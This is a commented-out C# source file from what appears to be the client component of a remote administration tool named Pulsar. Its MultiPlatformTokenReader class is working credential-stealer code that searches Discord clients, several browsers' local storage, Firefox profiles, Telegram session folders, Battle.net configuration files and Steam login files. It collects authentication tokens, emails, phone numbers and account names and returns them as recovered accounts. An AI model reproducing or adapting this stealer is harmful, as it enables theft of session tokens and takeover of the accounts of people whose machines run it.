//using Pulsar.Common.Models;
//using System;
//using System.Collections.Concurrent;
//using System.Collections.Generic;
//using System.Diagnostics;
//using System.IO;
//using System.Linq;
//using System.Text;
//using System.Text.RegularExpressions;
//using System.Threading.Tasks;

//namespace Pulsar.Client.Recovery
//{
//    internal static class MultiPlatformTokenReader
//    {
//        private const int MaxDegreeOfParallelism = 4;
//        private static readonly Regex DiscordTokenRegex = new Regex(@"(mfa\.[\w-]{84}|[\w-]{24,30}\.[\w-]{6}\.[\w-]{27,40})", RegexOptions.Compiled);
//        private static readonly Regex EmailRegex = new Regex(@"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", RegexOptions.Compiled);
//        private static readonly Regex SteamIdRegex = new Regex(@"\""(7656\d{13})\""", RegexOptions.Compiled);
//        private static readonly Regex AccountNameRegex = new Regex(@"AccountName""\s+""([^""]+)""", RegexOptions.Compiled);
//        private static readonly Regex AutoLoginRegex = new Regex(@"AutoLoginUser""\s+""([^""]+)""", RegexOptions.Compiled);
//        private static readonly Regex TokenRegex = new Regex(@"[\w-]{20,}", RegexOptions.Compiled);
//        private static readonly Regex PhoneRegex = new Regex(@"(\+?\d{10,15})", RegexOptions.Compiled);

//        /// <summary>
//        /// Recovers Discord, Telegram, Battle.net, Steam, and Zoom tokens from various clients and browsers
//        /// </summary>
//        /// <returns>List of recovered accounts</returns>
//        public static List<RecoveredAccount> Read()
//        {
//            var tasks = new Task<List<RecoveredAccount>>[]
//            {
//                Task.Run(() => RecoverDiscordTokens()),
//                Task.Run(() => RecoverTelegramSessions()),
//                Task.Run(() => RecoverBattleNetTokens()),
//                Task.Run(() => RecoverSteamSessions())
//            };

//            Task.WaitAll(tasks);

//            var accounts = new List<RecoveredAccount>();
//            foreach (var task in tasks)
//            {
//                accounts.AddRange(task.Result);
//            }

//            return accounts;
//        }

//        #region Discord Recovery
//        private static List<RecoveredAccount> RecoverDiscordTokens()
//        {
//            var accounts = new ConcurrentBag<RecoveredAccount>();
//            var tokens = new ConcurrentDictionary<string, bool>();

//            // Discord desktop clients
//            var discordPaths = new[]
//            {
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord", "Local Storage", "leveldb"),
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordCanary", "Local Storage", "leveldb"),
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordPTB", "Local Storage", "leveldb")
//            };

//            // Browser paths for Discord web
//            var browserPaths = GetBrowserPaths();

//            var searchTasks = new List<Task>();

//            // Search Discord clients in parallel
//            foreach (var path in discordPaths)
//            {
//                if (Directory.Exists(path))
//                {
//                    searchTasks.Add(Task.Run(() =>
//                        SearchDiscordTokensInPath(path, "Discord", tokens, accounts)));
//                }
//            }

//            // Search browsers in parallel
//            foreach (var path in browserPaths)
//            {
//                if (Directory.Exists(path))
//                {
//                    var browserName = GetBrowserNameFromPath(path);
//                    searchTasks.Add(Task.Run(() =>
//                        SearchDiscordTokensInPath(path, browserName, tokens, accounts)));
//                }
//            }

//            // Search Firefox separately
//            searchTasks.Add(Task.Run(() => SearchFirefoxDiscordTokens(tokens, accounts)));

//            Task.WaitAll(searchTasks.ToArray());
//            return accounts.ToList();
//        }

//        private static void SearchDiscordTokensInPath(string path, string source, ConcurrentDictionary<string, bool> tokens, ConcurrentBag<RecoveredAccount> accounts)
//        {
//            try
//            {
//                var files = Directory.GetFiles(path, "*.ldb")
//                    .Concat(Directory.GetFiles(path, "*.log"))
//                    .ToArray();

//                Parallel.ForEach(files, new ParallelOptions { MaxDegreeOfParallelism = MaxDegreeOfParallelism }, file =>
//                {
//                    try
//                    {
//                        var content = File.ReadAllText(file);
//                        var matches = DiscordTokenRegex.Matches(content);

//                        foreach (Match match in matches)
//                        {
//                            if (IsValidDiscordToken(match.Value) && tokens.TryAdd(match.Value, true))
//                            {
//                                Debug.WriteLine($"[+] Discord Token found in {source} ({Path.GetFileName(file)}): {match.Value}");
//                                accounts.Add(CreateAccount("Discord", "Authentication Token", match.Value, "https://discord.com/",
//                                    source.Contains("Discord") ? "Discord Desktop" : $"{source} (Web)"));
//                            }
//                        }
//                    }
//                    catch (Exception ex)
//                    {
//                        Debug.WriteLine($"[!] Error reading {Path.GetFileName(file)} in {source}: {ex.Message}");
//                    }
//                });
//            }
//            catch (Exception ex)
//            {
//                Debug.WriteLine($"[!] Error accessing LevelDB path {path}: {ex.Message}");
//            }
//        }

//        private static void SearchFirefoxDiscordTokens(ConcurrentDictionary<string, bool> tokens, ConcurrentBag<RecoveredAccount> accounts)
//        {
//            try
//            {
//                string firefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
//                if (!Directory.Exists(firefoxPath)) return;

//                var profileDirs = Directory.GetDirectories(firefoxPath);
//                Parallel.ForEach(profileDirs, new ParallelOptions { MaxDegreeOfParallelism = MaxDegreeOfParallelism }, profileDir =>
//                {
//                    var firefoxFiles = new[]
//                    {
//                        Path.Combine(profileDir, "cookies.sqlite"),
//                        Path.Combine(profileDir, "webappsstore.sqlite"),
//                        Path.Combine(profileDir, "storage", "default", "https+++discord.com", "ls", "data.sqlite")
//                    };

//                    foreach (var filePath in firefoxFiles)
//                    {
//                        if (File.Exists(filePath))
//                        {
//                            try
//                            {
//                                var content = File.ReadAllText(filePath);
//                                var matches = DiscordTokenRegex.Matches(content);

//                                foreach (Match match in matches)
//                                {
//                                    if (IsValidDiscordToken(match.Value) && tokens.TryAdd(match.Value, true))
//                                    {
//                                        Debug.WriteLine($"[+] Firefox Discord Token found: {match.Value}");
//                                        accounts.Add(CreateAccount("Discord", "Authentication Token", match.Value, "https://discord.com/", "Firefox (Web)"));
//                                    }
//                                }
//                            }
//                            catch (Exception ex)
//                            {
//                                Debug.WriteLine($"[!] Firefox file error {Path.GetFileName(filePath)}: {ex.Message}");
//                            }
//                        }
//                    }
//                });
//            }
//            catch (Exception ex)
//            {
//                Debug.WriteLine($"[!] Firefox Discord token search error: {ex.Message}");
//            }
//        }

//        private static bool IsValidDiscordToken(string token)
//        {
//            if (string.IsNullOrEmpty(token)) return false;

//            if (token.StartsWith("mfa.") && token.Length >= 84) return true;

//            var parts = token.Split('.');
//            return parts.Length == 3 &&
//                   parts[0].Length >= 24 && parts[0].Length <= 30 &&
//                   parts[1].Length == 6 &&
//                   parts[2].Length >= 27 && parts[2].Length <= 40;
//        }
//        #endregion

//        #region Telegram Recovery
//        private static List<RecoveredAccount> RecoverTelegramSessions()
//        {
//            var accounts = new ConcurrentBag<RecoveredAccount>();

//            // Telegram Desktop paths
//            var telegramPaths = new[]
//            {
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata"),
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Telegram Desktop", "tdata")
//            };

//            Parallel.ForEach(telegramPaths, new ParallelOptions { MaxDegreeOfParallelism = MaxDegreeOfParallelism }, telegramPath =>
//            {
//                if (Directory.Exists(telegramPath))
//                {
//                    try
//                    {
//                        // Look for map files and session files
//                        var mapFile = Path.Combine(telegramPath, "map");
//                        if (File.Exists(mapFile))
//                        {
//                            var mapContent = File.ReadAllText(mapFile);
//                            var phoneMatches = PhoneRegex.Matches(mapContent);
//                            foreach (Match match in phoneMatches)
//                            {
//                                accounts.Add(CreateAccount("Telegram", $"User {match.Value}", "Session Data", "https://telegram.org/", "Telegram Desktop"));
//                            }
//                        }

//                        // Look for session files
//                        var sessionFiles = Directory.GetFiles(telegramPath, "*.key");
//                        foreach (var sessionFile in sessionFiles)
//                        {
//                            var fileName = Path.GetFileNameWithoutExtension(sessionFile);
//                            if (fileName.StartsWith("usertag") || fileName.StartsWith("user"))
//                            {
//                                accounts.Add(CreateAccount("Telegram", $"Session {fileName}", "Encrypted Session", "https://telegram.org/", "Telegram Desktop"));
//                            }
//                        }

//                        // Look for D877 files (main session)
//                        var d877Files = Directory.GetFiles(telegramPath, "D877*");
//                        foreach (var d877File in d877Files)
//                        {
//                            accounts.Add(CreateAccount("Telegram", "Main Session", "Session Data", "https://telegram.org/", "Telegram Desktop"));
//                        }
//                    }
//                    catch (Exception ex)
//                    {
//                        Debug.WriteLine($"[!] Telegram recovery error: {ex.Message}");
//                    }
//                }
//            });

//            return accounts.ToList();
//        }
//        #endregion

//        #region Battle.net Recovery
//        private static List<RecoveredAccount> RecoverBattleNetTokens()
//        {
//            var accounts = new ConcurrentBag<RecoveredAccount>();

//            // Battle.net paths
//            string battleNetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");

//            if (Directory.Exists(battleNetPath))
//            {
//                try
//                {
//                    var configFiles = Directory.GetFiles(battleNetPath, "*.*", SearchOption.AllDirectories)
//                        .Where(file =>
//                            file.EndsWith(".config", StringComparison.OrdinalIgnoreCase) ||
//                            file.EndsWith(".xml", StringComparison.OrdinalIgnoreCase) ||
//                            file.EndsWith(".json", StringComparison.OrdinalIgnoreCase))
//                        .ToArray();

//                    Parallel.ForEach(configFiles, new ParallelOptions { MaxDegreeOfParallelism = MaxDegreeOfParallelism }, configFile =>
//                    {
//                        try
//                        {
//                            var content = File.ReadAllText(configFile);

//                            // Look for account information
//                            var emailMatches = EmailRegex.Matches(content);
//                            foreach (Match emailMatch in emailMatches)
//                            {
//                                if (IsValidEmail(emailMatch.Value))
//                                {
//                                    accounts.Add(CreateAccount("Battle.net", emailMatch.Value, "Stored Credentials", "https://battle.net/", "Battle.net Client"));
//                                }
//                            }

//                            // Look for tokens
//                            var tokenMatches = TokenRegex.Matches(content);
//                            foreach (Match tokenMatch in tokenMatches)
//                            {
//                                if (tokenMatch.Length > 30 && IsLikelyToken(tokenMatch.Value)) // Likely a token
//                                {
//                                    accounts.Add(CreateAccount("Battle.net", "Authentication Token", tokenMatch.Value, "https://battle.net/", "Battle.net Client"));
//                                }
//                            }
//                        }
//                        catch (Exception ex)
//                        {
//                            Debug.WriteLine($"[!] Battle.net config read error: {ex.Message}");
//                        }
//                    });
//                }
//                catch (Exception ex)
//                {
//                    Debug.WriteLine($"[!] Battle.net recovery error: {ex.Message}");
//                }
//            }

//            return accounts.ToList();
//        }
//        #endregion

//        #region Steam Recovery
//        private static List<RecoveredAccount> RecoverSteamSessions()
//        {
//            var accounts = new ConcurrentBag<RecoveredAccount>();

//            // Steam paths
//            string steamPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam");
//            string steamConfigPath = Path.Combine(steamPath, "config");

//            if (Directory.Exists(steamConfigPath))
//            {
//                try
//                {
//                    var steamFiles = new[]
//                    {
//                        Path.Combine(steamConfigPath, "loginusers.vdf"),
//                        Path.Combine(steamConfigPath, "config.vdf")
//                    };

//                    Parallel.ForEach(steamFiles, new ParallelOptions { MaxDegreeOfParallelism = MaxDegreeOfParallelism }, steamFile =>
//                    {
//                        if (File.Exists(steamFile))
//                        {
//                            try
//                            {
//                                var content = File.ReadAllText(steamFile);
//                                ProcessSteamFile(content, steamFile, accounts);
//                            }
//                            catch (Exception ex)
//                            {
//                                Debug.WriteLine($"[!] Steam file read error {Path.GetFileName(steamFile)}: {ex.Message}");
//                            }
//                        }
//                    });
//                }
//                catch (Exception ex)
//                {
//                    Debug.WriteLine($"[!] Steam recovery error: {ex.Message}");
//                }
//            }

//            return accounts.ToList();
//        }

//        private static void ProcessSteamFile(string content, string filePath, ConcurrentBag<RecoveredAccount> accounts)
//        {
//            if (filePath.EndsWith("loginusers.vdf", StringComparison.OrdinalIgnoreCase))
//            {
//                // Extract Steam IDs
//                var steamIdMatches = SteamIdRegex.Matches(content);
//                foreach (Match match in steamIdMatches)
//                {
//                    accounts.Add(CreateAccount("Steam", $"SteamID: {match.Groups[1].Value}", "Remembered Account", "https://steamcommunity.com/", "Steam Client"));
//                }

//                // Extract account names
//                var accountNameMatches = AccountNameRegex.Matches(content);
//                foreach (Match match in accountNameMatches)
//                {
//                    accounts.Add(CreateAccount("Steam", match.Groups[1].Value, "Remembered Account", "https://steamcommunity.com/", "Steam Client"));
//                }
//            }
//            else if (filePath.EndsWith("config.vdf", StringComparison.OrdinalIgnoreCase))
//            {
//                // Extract auto-login accounts
//                var autoLoginMatches = AutoLoginRegex.Matches(content);
//                foreach (Match match in autoLoginMatches)
//                {
//                    accounts.Add(CreateAccount("Steam", match.Groups[1].Value, "Auto-Login Account", "https://steamcommunity.com/", "Steam Client"));
//                }
//            }
//        }
//        #endregion

//        #region Helper Methods
//        private static string[] GetBrowserPaths()
//        {
//            return new[]
//            {
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
//                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")
//            };
//        }

//        private static string GetBrowserNameFromPath(string path)
//        {
//            if (path.Contains("Google\\Chrome")) return "Chrome";
//            if (path.Contains("Microsoft\\Edge")) return "Edge";
//            if (path.Contains("BraveSoftware")) return "Brave";
//            if (path.Contains("Opera Software")) return "Opera";
//            if (path.Contains("Vivaldi")) return "Vivaldi";
//            return "Unknown Browser";
//        }

//        private static RecoveredAccount CreateAccount(string application, string username, string password, string url, string source)
//        {
//            return new RecoveredAccount
//            {
//                Application = $"{application} ({source})",
//                Username = username,
//                Password = password,
//                Url = url
//            };
//        }

//        private static bool IsValidEmail(string email)
//        {
//            if (string.IsNullOrEmpty(email)) return false;
//            try
//            {
//                var addr = new System.Net.Mail.MailAddress(email);
//                return addr.Address == email;
//            }
//            catch
//            {
//                return false;
//            }
//        }

//        private static bool IsLikelyToken(string text)
//        {
//            // Check if text looks like a token (mix of letters, numbers, hyphens, underscores)
//            return Regex.IsMatch(text, @"^[a-zA-Z0-9\-_]+$") &&
//                   text.Length >= 20 &&
//                   !text.Contains(" ") &&
//                   !text.All(char.IsDigit);
//        }
//        #endregion
//    }
//}